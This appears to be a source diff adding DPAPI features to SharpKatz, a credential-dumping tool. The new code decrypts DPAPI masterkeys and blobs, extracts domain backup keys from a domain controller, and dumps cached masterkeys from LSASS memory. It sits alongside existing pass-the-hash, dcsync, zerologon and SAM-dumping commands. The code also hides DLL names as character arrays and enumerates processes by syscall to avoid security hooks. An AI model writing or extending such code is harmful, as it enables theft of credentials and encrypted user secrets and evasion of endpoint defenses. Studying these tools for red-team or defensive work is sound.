@@ -60,6 +60,18 @@ namespace SharpKatz
             string password = null;
             string parentpid = null;
             string parentname = null;
+            // DPAPI parameters
+            string sid = null;
+            string hash = null;
+            string pvkFile = null;
+            string backupKey = null;
+            string masterkeyFile = null;
+            string blobFile = null;
+            string mkFile = null;
+            string mkGuid = null;
+            string masterkey = null;
+            string outputFile = null;
+            string outputDir = null;
             bool showhelp = false;
 
             OptionSet opts = new OptionSet()
@@ -104,6 +116,21 @@ namespace SharpKatz
                 { "ParentName=", "--ParentName [parentname]", v => parentname = v },
 
                 { "Altservice=", "--Altservice [alternative service]", v => altservice = v },
+
+                // DPAPI parameters
+                { "Sid=", "--Sid [user SID]", v => sid = v },
+                { "Hash=", "--Hash [SHA1/NTLM hash]", v => hash = v },
+                { "PvkFile=", "--PvkFile [pvk file path]", v => pvkFile = v },
+                { "BackupKey=", "--BackupKey [domain backup key hex]", v => backupKey = v },
+                { "MasterkeyFile=", "--MasterkeyFile [masterkey file path]", v => masterkeyFile = v },
+                { "BlobFile=", "--BlobFile [DPAPI blob file path]", v => blobFile = v },
+                { "MkFile=", "--MkFile [masterkey cache file (guid:hex)]", v => mkFile = v },
+                { "MkGuid=", "--MkGuid [masterkey GUID]", v => mkGuid = v },
+                { "Masterkey=", "--Masterkey [masterkey hex]", v => masterkey = v },
+                { "OutputFile=", "--OutputFile [output file path]", v => outputFile = v },
+                { "OutputDir=", "--OutputDir [output directory]", v => outputDir = v },
+                { "DC=", "--DC [domain controller]", v => dc = v },
+
                 { "h|?|help",  "Show available options", v => showhelp = v != null },
             };
 
@@ -188,6 +215,18 @@ namespace SharpKatz
                 Console.WriteLine("  Example: --Command spawn --Binary C:\\Windows\\System32\\cmd.exe");
                 Console.WriteLine("  Example: --Command spawn --Binary cmd.exe --ParentPid 1234");
                 Console.WriteLine("  Example: --Command spawn --Binary cmd.exe --ParentName svchost");
+                Console.WriteLine();
+                Console.WriteLine("  DPAPI:");
+                Console.WriteLine("  Example: --Command dpapimasterkey --MasterkeyFile <path> --Sid <user SID> --Password <password>");
+                Console.WriteLine("  Example: --Command dpapimasterkey --MasterkeyFile <path> --Sid <user SID> --Hash <SHA1 hash>");
+                Console.WriteLine("  Example: --Command dpapimasterkey --MasterkeyFile <path> --PvkFile <domain backup key .pvk>");
+                Console.WriteLine("  Example: --Command dpapimasterkey --MasterkeyFile <path> --BackupKey <hex backup key>");
+                Console.WriteLine("  Example: --Command dpapiblob --BlobFile <path> --Masterkey <hex key>");
+                Console.WriteLine("  Example: --Command dpapiblob --BlobFile <path> --MkGuid <GUID> --Masterkey <hex key>");
+                Console.WriteLine("  Example: --Command dpapiblob --BlobFile <path> --MkFile <guid:hex file>");
+                Console.WriteLine("  Example: --Command backupkeys --DC dc.domain.local");
+                Console.WriteLine("  Example: --Command backupkeys --DC dc.domain.local --OutputDir C:\\keys");
+                Console.WriteLine("  Example: --Command sekurlsadpapi");
                 return;
             }
 
@@ -199,7 +238,9 @@ namespace SharpKatz
                 !command.Equals("pth") && !command.Equals("zerologon") && !command.Equals("printnightmare") && !command.Equals("hivenightmare") &&
                 !command.Equals("listshadows") && !command.Equals("dumpsam") &&
                 !command.Equals("lsasecrets") && !command.Equals("lsacache") && !command.Equals("certexport") &&
-                !command.Equals("token") && !command.Equals("vault") && !command.Equals("spawn"))
+                !command.Equals("token") && !command.Equals("vault") && !command.Equals("spawn") &&
+                !command.Equals("dpapimasterkey") && !command.Equals("dpapiblob") && !command.Equals("backupkeys") &&
+                !command.Equals("sekurlsadpapi"))
             {
                 Console.WriteLine("Unknown command");
                 return;
@@ -302,6 +343,40 @@ namespace SharpKatz
                 return;
             }
 
+            if (command.Equals("dpapimasterkey"))
+            {
+                if (string.IsNullOrEmpty(masterkeyFile))
+                {
+                    Console.WriteLine("   Missing required parameter -> MasterkeyFile");
+                    return;
+                }
+                Module.DpapiMasterkey.DecryptMasterkey(masterkeyFile, password, sid, hash, pvkFile, backupKey);
+                return;
+            }
+
+            if (command.Equals("dpapiblob"))
+            {
+                if (string.IsNullOrEmpty(blobFile))
+                {
+                    Console.WriteLine("   Missing required parameter -> BlobFile");
+                    return;
+                }
+                Module.DpapiBlob.DecryptBlobFile(blobFile, mkGuid, masterkey, mkFile, outputFile);
+                return;
+            }
+
+            if (command.Equals("backupkeys"))
+            {
+                if (string.IsNullOrEmpty(dc))
+                {
+                    Console.WriteLine("   Missing required parameter -> DC or DomainController");
+                    return;
+                }
+                bool exportPvk = true;
+                Module.LsadumpBackupkeys.ExtractBackupKeys(dc, outputDir, exportPvk);
+                return;
+            }
+
             // --- Commands that need LSASS or elevated context ---
 
             if (!command.Equals("dcsync") && !command.Equals("zerologon") && !command.Equals("printnightmare") && !command.Equals("hivenightmare") && !command.Equals("listshadows") && !command.Equals("dumpsam") && !command.Equals("lsasecrets") && !command.Equals("lsacache") && !command.Equals("certexport"))
@@ -321,6 +396,7 @@ namespace SharpKatz
                 IntPtr kerberos = IntPtr.Zero;
                 IntPtr tspkg = IntPtr.Zero;
                 IntPtr lsasslive = IntPtr.Zero;
+                IntPtr dpapisrv = IntPtr.Zero;
                 IntPtr hProcess = IntPtr.Zero;
 
                 // Find target process PID via syscall enumeration (avoid managed Process API hooks)
@@ -338,7 +414,7 @@ namespace SharpKatz
                 ProcessModuleCollection processModules = plsass.Modules;
                 int modulefound = 0;
 
-                for (int i = 0; i < processModules.Count && modulefound < 5; i++)
+                for (int i = 0; i < processModules.Count && modulefound < 6; i++)
                 {
                     string lower = processModules[i].ModuleName.ToLowerInvariant();
 
@@ -347,6 +423,7 @@ namespace SharpKatz
                     string sMsv = new string(new char[] { 'm','s','v','1','_','0','.','d','l','l' });
                     string sKerb = new string(new char[] { 'k','e','r','b','e','r','o','s','.','d','l','l' });
                     string sTspkg = new string(new char[] { 't','s','p','k','g','.','d','l','l' });
+                    string sDpapisrv = new string(new char[] { 'd','p','a','p','i','s','r','v','.','d','l','l' });
 
                     if (lower.Contains(sLsasrv))
                     {
@@ -373,6 +450,11 @@ namespace SharpKatz
                         tspkg = processModules[i].BaseAddress;
                         modulefound++;
                     }
+                    else if (lower.Contains(sDpapisrv))
+                    {
+                        dpapisrv = processModules[i].BaseAddress;
+                        modulefound++;
+                    }
                 }
 
                 // Use minimum required access rights instead of PROCESS_ALL_ACCESS
@@ -386,7 +468,17 @@ namespace SharpKatz
 
                 Keys keys = new Keys(hProcess, lsasrv, osHelper);
 
-                if (command.Equals("pth"))
+                if (command.Equals("sekurlsadpapi"))
+                {
+                    // sekurlsa::dpapi — dump cached DPAPI masterkeys from LSASS
+                    if (dpapisrv == IntPtr.Zero)
+                    {
+                        Console.WriteLine("   [-] dpapisrv.dll not found in LSASS modules");
+                        Console.WriteLine("   [-] DPAPI masterkey cache may not be available");
+                    }
+                    Module.DpapiSekurlsa.FindCredentials(hProcess, dpapisrv, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), new List<Logon>());
+                }
+                else if (command.Equals("pth"))
                 {
                     if (string.IsNullOrEmpty(binary))
                         binary = "cmd.exe";
@@ -423,6 +515,10 @@ namespace SharpKatz
 
                     if (command.Equals("logonpasswords") || command.Equals("wdigest"))
                         Module.WDigest.FindCredentials(hProcess, wdigest, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist);
+
+                    // sekurlsa::dpapi — dump cached DPAPI masterkeys (part of logonpasswords)
+                    if (command.Equals("logonpasswords") && dpapisrv != IntPtr.Zero)
+                        Module.DpapiSekurlsa.FindCredentials(hProcess, dpapisrv, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist);
 
                     Utility.PrintLogonList(logonlist);
                 }
